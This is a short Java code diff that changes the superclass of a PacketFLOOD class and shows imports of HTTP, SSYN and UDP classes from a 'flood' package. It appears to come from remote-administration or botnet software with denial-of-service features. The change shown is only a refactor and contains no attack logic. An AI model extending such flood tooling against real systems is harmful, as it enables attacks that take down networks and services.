@@ -11,7 +11,7 @@ import com.redpois0n.flood.HTTP;
 import com.redpois0n.flood.SSYN;
 import com.redpois0n.flood.UDP;
 
-public class PacketFLOOD extends Packet {
+public class PacketFLOOD extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
